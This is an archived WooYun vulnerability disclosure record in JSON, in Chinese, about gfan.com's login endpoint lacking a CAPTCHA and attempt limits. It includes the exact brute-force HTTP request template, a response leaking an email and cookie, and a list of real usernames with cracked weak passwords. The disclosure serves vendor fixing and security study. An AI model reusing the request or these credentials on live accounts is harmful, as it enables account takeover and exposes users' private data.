{"id": 8906, "wybug_id": "wooyun-2013-035790", "wybug_title": "机锋网设计不当可猜解他人账号密码也可撞库（已证明）", "wybug_corp": "机锋网", "wybug_author": "niliu", "wybug_date": "2013-09-02 11:53", "wybug_open_date": "2013-10-17 11:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "逻辑错误", "设计不当", "认证设计不合理", "设计错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-09-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-09-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-17：\t细节向公众公开  简要描述： 机锋网设计不当可任意登陆他人账号 详细说明：  机锋网主站设计不当可，导致可任意登陆他人账号...问题出现在登陆处，登陆时无验证码，也无错误次数限制.用户名test，密码111111，登陆时抓包.\n\n抓包\nGET /plus/cd.php?username=§test§&password=111111&logins=userlogin HTTP/1.0Host: www.gfan.comProxy-Connection: Keep-AliveX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1Accept: */*Referer: http://www.gfan.com/Accept-Language: zh-CN,zh;q=0.8Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Cookie: Hm_lvt_6790309a725fc338d4fe3efb72d4a6ea=1375005492; PHPSESSID=1nqdaf2useu041dvo9201cui12\n对用户名username参数进行破解\n\n登陆后截图\n\n我说看下重置&支付页面，结果发现还暴路径了\nNotice: Undefined offset: 1 in /home/gfangame/includes/init.php on line 88\n\n\n破解成功后的返回包里也泄露了用户邮箱[马赛克]ds@163.com\nHTTP/1.1 200 OKServer: GWS/1.0.0Date: Sat, 31 Aug 2013 11:05:29 GMTContent-Type: text/html; charset=UTF-8Connection: closeVary: Accept-EncodingExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheSet-Cookie: gfan_cookie=Mugj3wwLD5M3FsWhcgNdfTn%2FQc7cwMbM; expires=Sun, 01-Sep-2013 11:05:29 GMT; path=/; domain=.gfan.com{\"name\":\"cao\",\"uid\":\"98395\",\"email\":\"[马赛克]ids@163.com\",\"servers\":null,\"gameurl\":null}\n登陆账号后直接可以查看用户相册，网盘等隐私信息..在登陆用户wan的时候发现数据库报错...\n\n再次登陆就可以了\n\n   漏洞证明：  这是成功的，如果变换密码，或者对手机号或者邮箱进行才解也会有一大批的。\ncao,111111wan,111111paul,111111---------------------------------------liu,123456huang,123456cai,123456tom,123456john,123456robert,123456qweasd,123456jack,123456jenny,123456anderson,123456susan,123456joan,123456oliver,123456diana,123456ada,123456------------------------------------------我就不一个个截图啦.\n   修复方案：  登陆时候加上验证码吧~求个小礼物~\\(^o^)/~   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2013-09-04 14:40 厂商回复： 多谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}